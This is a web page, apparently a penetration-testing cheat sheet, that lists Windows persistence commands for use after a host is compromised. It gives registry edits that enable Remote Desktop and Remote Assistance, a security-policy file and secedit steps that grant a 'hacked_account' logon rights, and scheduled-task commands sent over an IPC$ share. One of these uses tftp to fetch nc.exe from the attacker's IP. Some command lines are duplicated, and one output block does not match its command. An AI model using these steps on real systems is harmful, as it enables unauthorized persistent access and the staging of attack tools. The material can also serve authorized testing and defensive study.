<!-- Code for collapse and expand -->
<script type="text/javascript"> 
$(document).ready(function() { 
$('div.view').hide(); 
$('div.slide').click(function() {
$(this).next('div.view').slideToggle('fast'); 
return false; 
}); 
}); 
</script>

# Windows General Persistence Commands

Commands to run to maintain persistence after you have exploited it and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.

### Remote Assistance Enable
 * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f`
 * **Description**: **Must be admin to run this.** Enable remote assistance through adding a registry entry on the local system.
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 2008:** Show/Hide</div><div class="view"><code>C:\Windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
The operation completed successfully.</code></div> 

### Remote Desktop Enable - Method 1
 * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f`
 * **Description**: **Must be admin to run this.** Enable remote desktop through adding a registry entry on the local system.
 * **Output**:
   * <div class="slide" style="cursor: pointer;"> **Windows 2008:** Show/Hide</div><div class="view"><code>C:\Windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
The operation completed successfully.</code></div> 

### Remote Desktop Enable - Method 2
Remote Desktop allows a remote user to receive a graphical "desktop" of the target (compromised) system. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 53)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely enable remote desktop using the commands below.

 1. On the compromised system, create a file named `fix_ts_policy.ini` containing the contents below. Change the *"hacked_account"* value to the account you have compromised on the remote system.

    <pre>
     [Unicode]
         Unicode=yes
         [Version]
         signature="$CHICAGO$"
         Revision=1
         [Privilege Rights] [Privilege Rights]
         seremoteinteractivelogonright = hacked_account
         seinteractivelogonright = hacked_account
         sedenyinteractivelogonright =
         sedenyremoteinteractivelogonright =
         sedenynetworklogonright =
    </pre>

 1. Create another file named `enable_ts.reg` containing the contents below. 

    <pre>
     Windows Registry Editor Version 5.00
     [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
     "fDenyTSConnections"=dword:00000000
     "TSEnabled"=dword:00000001
     "TSUserEnabled"=dword:00000000
    </pre>

 1. On the remote system, execute the following commands:
      
    <pre>c:\> sc config termservice start= auto sc config termservice start= auto
c:\> regedit /s enable_ts.reg
c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\new.secedit.sdb
c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\orig.secedit.sdb
c:\> secedit /configure /db new.secedit.sdb /cfg fix_ts_policy.ini
c:\> gpupdate /Force
c:\> net start "terminal services"
</pre>


### Scheduler
The [Windows scheduler](http://support.microsoft.com/kb/313565) can be used to further compromise a system. It usually runs at the SYSTEM account privilege level. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 58)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely schedule tasks using the commands below.

<pre>
c:\> net use \\[TargetIP]\ipc$ password /user:username
c:\> at \\[TargetIP] 12:00 pm command
</pre>

An example you might run on the remote system might be: `at \\192.168.1.1 12:00pm tftp -I [MyIP] GET nc.exe`